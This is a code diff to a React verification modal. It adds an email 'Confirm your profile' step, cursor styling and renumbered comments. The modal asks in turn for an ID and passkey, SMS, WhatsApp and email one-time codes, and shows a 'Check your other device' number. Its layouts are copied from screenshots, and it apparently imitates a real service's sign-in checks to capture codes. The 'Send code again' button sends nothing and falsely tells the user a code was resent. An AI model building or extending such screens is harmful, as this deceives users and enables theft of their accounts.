@@ -48,6 +48,7 @@ export default function VerifyModal({
   const [candidateId, setCandidateId] = useState("");
   const [passkey, setPasskey] = useState("");
   const [code, setCode] = useState("");
+  const [emailResent, setEmailResent] = useState(false);
 
   // Timers: SMS = 180s (3:00), WhatsApp = 60s (1:00)
   const initialSeconds = codeNumber === 2 ? 60 : 180;
@@ -56,6 +57,7 @@ export default function VerifyModal({
   useEffect(() => {
     if (stage === "code") {
       setCode("");
+      setEmailResent(false);
       setTimerSeconds(codeNumber === 2 ? 60 : 180);
     }
   }, [stage, codeNumber]);
@@ -102,7 +104,6 @@ export default function VerifyModal({
   // 2. DISPLAY / POP-OUT CODE STATE ("Check your other device" popup matching media_1788387615346.png)
   if (stage === "displayCode") {
     const formattedNumber = (displayCode || "11").trim();
-    // Split into spaced numbers like "1 1" if single token or keep clean
     const spacedNumber = formattedNumber.length <= 4 ? formattedNumber.split("").join(" ") : formattedNumber;
 
     return (
@@ -233,7 +234,7 @@ export default function VerifyModal({
               <button
                 type="submit"
                 disabled={submitting || !code.trim()}
-                className="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white py-3 rounded-full font-bold text-sm transition-colors disabled:opacity-50 shadow-sm"
+                className="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white py-3 rounded-full font-bold text-sm transition-colors disabled:opacity-50 shadow-sm cursor-pointer"
               >
                 {submitting ? "Submitting…" : "Continue"}
               </button>
@@ -241,7 +242,7 @@ export default function VerifyModal({
               <button
                 type="button"
                 onClick={handleTryAnotherWay}
-                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center"
+                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center cursor-pointer"
               >
                 Try another way
               </button>
@@ -321,7 +322,7 @@ export default function VerifyModal({
               <button
                 type="submit"
                 disabled={submitting || !code.trim()}
-                className="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white py-3 rounded-full font-bold text-sm transition-colors disabled:opacity-50 shadow-sm"
+                className="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white py-3 rounded-full font-bold text-sm transition-colors disabled:opacity-50 shadow-sm cursor-pointer"
               >
                 {submitting ? "Submitting…" : "Continue"}
               </button>
@@ -329,7 +330,7 @@ export default function VerifyModal({
               <button
                 type="button"
                 onClick={handleTryAnotherWay}
-                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center"
+                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center cursor-pointer"
               >
                 Try another way
               </button>
@@ -409,7 +410,7 @@ export default function VerifyModal({
               <button
                 type="submit"
                 disabled={submitting || !code.trim()}
-                className="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white py-3 rounded-full font-bold text-sm transition-colors disabled:opacity-50 shadow-sm"
+                className="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white py-3 rounded-full font-bold text-sm transition-colors disabled:opacity-50 shadow-sm cursor-pointer"
               >
                 {submitting ? "Submitting…" : "Continue"}
               </button>
@@ -417,7 +418,7 @@ export default function VerifyModal({
               <button
                 type="button"
                 onClick={handleTryAnotherWay}
-                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center"
+                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center cursor-pointer"
               >
                 Try another way
               </button>
@@ -428,7 +429,99 @@ export default function VerifyModal({
     );
   }
 
-  // 6. CODE 4 / FALLBACK CODE INPUT (Additional Code 4)
+  // 6. EMAIL POPUP (Code 4 - Confirm your profile) -> max-w-[580px] matching media_1788470826941.png
+  if (stage === "code" && codeNumber === 4) {
+    return (
+      <Shell maxWidth="max-w-[580px]">
+        <div className="space-y-4 font-sans">
+          {/* Top Line: Candidate Name */}
+          <p className="text-sm font-semibold text-gray-800">
+            {candidateName || "Candidate"}
+          </p>
+
+          {/* Heading */}
+          <h2 className="text-2xl font-bold text-gray-900 leading-tight">
+            Confirm your profile
+          </h2>
+
+          {/* Subtitle */}
+          <p className="text-xs text-gray-600 leading-relaxed">
+            We sent a code to your email. Enter that code to confirm your account.
+          </p>
+
+          {/* HD Email Illustration */}
+          <div className="my-2 rounded-2xl overflow-hidden shadow-xs">
+            {/* eslint-disable-next-line @next/next/no-img-element */}
+            <img
+              src="/images/illustration-email.png"
+              alt="Confirm your profile"
+              className="w-full h-auto object-cover rounded-2xl select-none"
+            />
+          </div>
+
+          {errorMessage && (
+            <p className="rounded-lg border border-red-200 bg-red-50/80 px-4 py-2.5 text-xs text-red-700 font-medium">
+              {errorMessage}
+            </p>
+          )}
+
+          <form
+            onSubmit={(e) => {
+              e.preventDefault();
+              onSubmitCode(code.trim());
+            }}
+            className="space-y-4 pt-1"
+          >
+            {/* Code Input Box with placeholder "Enter code" */}
+            <div className="border border-gray-300 focus-within:border-[#0069ff] focus-within:ring-1 focus-within:ring-[#0069ff] rounded-xl px-4 py-3 bg-white transition-all shadow-2xs">
+              <input
+                id="email-code-input"
+                required
+                autoFocus
+                value={code}
+                onChange={(e) => setCode(e.target.value)}
+                placeholder="Enter code"
+                className="w-full text-base font-mono font-bold text-gray-900 outline-none bg-transparent tracking-wide placeholder:font-sans placeholder:font-normal placeholder:text-gray-400"
+              />
+            </div>
+
+            {/* Action: Continue Button */}
+            <button
+              type="submit"
+              disabled={submitting || !code.trim()}
+              className="w-full bg-[#0069ff] hover:bg-[#0055d4] text-white py-3.5 rounded-full font-bold text-sm transition-colors disabled:opacity-50 shadow-sm cursor-pointer"
+            >
+              {submitting ? "Submitting…" : "Continue"}
+            </button>
+
+            {/* Sub-actions: Send code again & Try another way */}
+            <div className="flex flex-col items-center gap-1 pt-1">
+              <button
+                type="button"
+                onClick={() => {
+                  setEmailResent(true);
+                  setTimeout(() => setEmailResent(false), 3000);
+                }}
+                className="text-sm font-semibold text-gray-900 hover:text-[#0069ff] transition-colors py-1 cursor-pointer"
+              >
+                {emailResent ? "✓ Code resent to your email" : "Send code again"}
+              </button>
+
+              <button
+                type="button"
+                onClick={handleTryAnotherWay}
+                className="text-xs text-gray-500 hover:text-gray-800 transition-colors py-1 cursor-pointer"
+              >
+                Try another way
+              </button>
+            </div>
+          </form>
+        </div>
+      </Shell>
+    );
+  }
+
+  // 7. GENERIC / FALLBACK CODE INPUT
   if (stage === "code") {
     const label = getCodeLabel(codeNumber);
 
@@ -489,7 +582,7 @@ export default function VerifyModal({
     );
   }
 
-  // 7. ID & PASSKEY ENTRY STAGE (Initial verification popup)
+  // 8. ID & PASSKEY ENTRY STAGE (Initial verification popup)
   return (
     <Shell maxWidth="max-w-sm">
       <h2 className="font-display text-2xl text-ink">Verify to Confirm</h2>
